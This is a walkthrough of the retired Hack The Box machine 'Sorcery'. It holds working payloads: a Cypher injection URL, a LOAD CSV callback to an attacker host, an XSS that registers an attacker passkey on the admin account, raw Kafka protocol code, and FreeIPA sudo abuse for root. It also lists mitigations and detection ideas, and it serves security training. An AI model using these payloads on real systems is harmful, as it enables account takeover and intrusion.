---
machine: Sorcery
os: Linux
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, neo4j, cypher-injection, webauthn, kafka, freeipa]
---

# Sorcery — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

Four modern layers chained: **Cypher injection** in a **Neo4j**-backed app to overwrite the administrator's password, **XSS in the passkey (WebAuthn) registration** to attach an attacker authenticator to that account, raw **Kafka protocol** to bypass the HTTP proxy and read internal credentials, and a **FreeIPA** misconfiguration for root. Each leg is odd on its own; together they are the most realistic enterprise scenario of the season.

## Recon

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,302,401
```

```text
80/tcp    http   "wizards" app
7474/tcp  http   Neo4j (web UI)
7687/tcp  bolt   Neo4j
8081/tcp  http   admin panel
9092/tcp  kafka  filtered, reachable only through the proxy
```

## Enumeration

- The app registers users and stores data in **Neo4j**; the lookup endpoint is `/api/wizard?name=<name>`.
- `/admin` requires a session **and** a registered **passkey**: there is a `/api/admin/webauthn/register/{initiate,complete}` flow.
- Port 8081 proxies to the Kafka broker on 9092; 9092 answers nothing from outside.
- `bolt://` on 7687 confirms Neo4j even without credentials.

## Foothold: Cypher injection

The query is concatenated:

```cypher
MATCH (w:Wizard {name: '<input>'}) RETURN w
```

Close the quote, cut the `RETURN` with `//` and `UNION` to read other nodes:

```text
/api/wizard?name=Merlin'}) RETURN w UNION MATCH (n) WHERE n:Secret RETURN n //
```

To take the admin account you do not need to read the hash: **overwrite** it with one computed locally (same algorithm the app uses) through `SET`. The new password logs you in as admin; the panel still asks for the passkey.

```text
LOAD CSV FROM 'http://<IP>:8000/x'   # confirms outbound connectivity (SSRF)
```

## Lateral movement: passkeys and Kafka

### 1. Attacker passkey on the admin account

`/admin/passkeys` renders `credential.name` **unescaped**. Register a credential whose name is an XSS; when the administrator opens the list, their browser runs the JS, starts the WebAuthn registration and **completes the ceremony with the attacker's authenticator**:

```html
<img src=x onerror="fetch('/api/admin/webauthn/register/initiate',{method:'POST'})
 .then(r=>r.json()).then(c=>navigator.credentials.create({publicKey:c})
 .then(k=>fetch('/api/admin/webauthn/register/complete',{method:'POST',body:JSON.stringify(k)})))">
```

From then on you log in with your own passkey: WebAuthn protects nothing if registration can be started from an XSS.

### 2. Kafka through the proxy

The proxy forwards bytes whose first byte looks like a Kafka request. Speak the **binary protocol** by hand: `ApiVersions` to validate, `Metadata` (`ApiKey 3`) to discover topics, `Fetch` (`ApiKey 1`) to read messages.

```python
import socket, struct
def req(api, ver, corr, cid, payload=b''):
    body  = struct.pack('>hhi', api, ver, corr)
    body += struct.pack('>h', len(cid)) + cid.encode() + payload
    return struct.pack('>i', len(body)) + body

s = socket.create_connection(('<IP>', 8081))
s.send(req(18, 0, 1, 'x'))      # ApiVersions
print(s.recv(4096))
```

An internal topic yields a **service account** and its password.

## Privilege escalation: FreeIPA

```bash
kinit svc-deploy
ipa-getkeytab -s ipa.sorcery.htb -p svc-deploy -k svc.keytab
ldapsearch -Y GSSAPI -H ldap://ipa.sorcery.htb -b "cn=groups,cn=accounts,dc=sorcery,dc=htb" | grep -i sudo
```

The FreeIPA sudo rule maps to a **group** the service account belongs to, and points at a script that group can write. Edit the script, run it through the rule: root.

```bash
sudo -l          # the rule references the group, not the user
sudo <script>    # root
```

## Evidence (redacted)

```text
/home/<user>/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lessons

- Graph databases are injectable too: `MATCH ... {name: '$input'}` is no safer than a concatenated `SELECT`.
- **WebAuthn** protects nothing if passkey registration can be started from an XSS: the passkey becomes the attacker's.
- A proxy validating "HTTP only" while forwarding arbitrary bytes exposes whatever binary protocol sits behind it.
- FreeIPA permissions inherit by group: a service account in the wrong group is root.
- Mitigation: parameterised Neo4j queries, CSP and escaping in the passkey panel with `origin` verification on registration, real segmentation (not convenience proxies) for Kafka, and sudo rules bound to users and exact binaries.

## Mitigations and detection

- Neo4j with parameterised queries and a read-only app user; `LOAD CSV` disabled or restricted by config/`apoc`.
- WebAuthn registration validating `origin` and `rpId`, and a panel that escapes every credential name.
- Kafka never exposed through an HTTP proxy: if a gateway exists, it should parse the protocol and validate `ApiKey`.
- FreeIPA: sudo rules without broad groups and service accounts with no host privileges.
- Detection: Cypher queries containing quotes and `UNION`, `register/initiate` calls from bot sessions, and Kafka bytes on an HTTP port.

## References

- [Neo4j — Cypher overview](https://neo4j.com/docs/cypher-manual/current/introduction/cypher-overview/)
- [W3C — WebAuthn Level 2](https://www.w3.org/TR/webauthn-2/)
- [Apache Kafka protocol guide](https://kafka.apache.org/protocol.html)
- [FreeIPA — sudo rules](https://www.freeipa.org/page/HowTo/Sudo)
